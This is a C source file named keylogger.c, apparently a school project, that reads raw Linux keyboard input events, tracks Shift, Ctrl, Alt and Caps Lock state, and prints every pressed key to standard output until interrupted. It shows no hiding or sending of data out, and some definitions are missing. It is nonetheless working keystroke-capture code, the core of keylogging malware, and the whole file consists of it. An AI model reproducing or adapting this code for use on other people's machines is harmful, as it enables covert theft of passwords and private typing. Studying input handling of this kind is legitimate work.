/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   keylogger.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/09/28 05:57:11 by root              #+#    #+#             */
/*   Updated: 2018/10/31 18:37:48 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

int						loop;

void 					sigint(int sig)
{
	(void)sig;
	loop = 0;
}

static int  		print_keysym(int code)
{
	int 			type;
	int 			value;
	const char 		*p;

	type = KTYP(code);
	value = KVAL(code);
	if (type >= syms_size) {
		code = code ^ 0xf000;
		if (code < 0)
			return printf("(null)");
		if (code < 0x80)
			return printf("%s", iso646_syms[code]);
		return printf("%#04x", code);
	}
	if (type == KT_LETTER)
		type = KT_LATIN;
	if (type < syms_size && value < syms[type].size && (p = syms[type].table[value])[0])
		return printf("%s", p);
	if (type == KT_META && value < 128 && value < syms[0].size && (p = syms[0].table[value])[0])
		return printf("Meta_%s", p);
	return printf("%#04x", code);
}

void					keylogger(int keybd, int **key_table)
{
	int					nbread;
	struct input_event	events[128];
	int 				modifier = 0; // Ctrl, Shift, Alt keys
	int 				value = 0; // which key have been pressed
	int 				state = 0; // state 0: released 1:pressed 2:repeated
	int 				capslock = 0;
	int 				numlock = 0;

	signal(SIGINT, sigint);
	loop = 1;
	while (loop)
	{
		nbread = read(keybd, events, sizeof(struct input_event) * 128);
		for (size_t i = 0; i < nbread / sizeof(struct input_event); i++)
		{
			if (events[i].type == EV_LED) {
				if (events[i].code == LED_CAPSL) {
					capslock = events[i].value;
					if (capslock)
						modifier += ((1 << modifiers[0].bit));
					else
						modifier -= ((1 << modifiers[0].bit));
				}
				else if (events[i].code == LED_NUML)
					numlock = events[i].value;
				(void)numlock;
			}
			else if (events[i].type == EV_KEY) {
				value = events[i].code;
				state = events[i].value;
			}
		}

		if (value == KEY_LEFTSHIFT || value == KEY_RIGHTSHIFT) {
			if (capslock)
				state = !state;
			if (state == 0)
				modifier -= ((1 << modifiers[0].bit)); // update position on the character table values
			else if (state == 1)
				modifier += ((1 << modifiers[0].bit)); // update position on the character table values
			state = 0;
		}
		else if (value == KEY_RIGHTALT) {
			if (state == 0)
				modifier -= ((1 << modifiers[1].bit)); // update position on the character table values
			else if (state == 1)
				modifier += ((1 << modifiers[1].bit)); // update position on the character table values
			state = 0;
		}
		else if (value == KEY_RIGHTCTRL || value == KEY_LEFTCTRL) {
			if (state == 0)
				modifier -= ((1 << modifiers[2].bit)); // update position on the character table values
			else if (state == 1)
				modifier += ((1 << modifiers[2].bit)); // update position on the character table values
			state = 0;
		}
		else if (value == KEY_LEFTALT) {
			if (state == 0)
				modifier -= ((1 << modifiers[3].bit)); // update position on the character table values
			else if (state == 1)
				modifier += ((1 << modifiers[3].bit)); // update position on the character table values
			state = 0;
		}

		if (state) {
			print_keysym(key_table[value][modifier]);
			fflush(stdout);
		}
	}
}
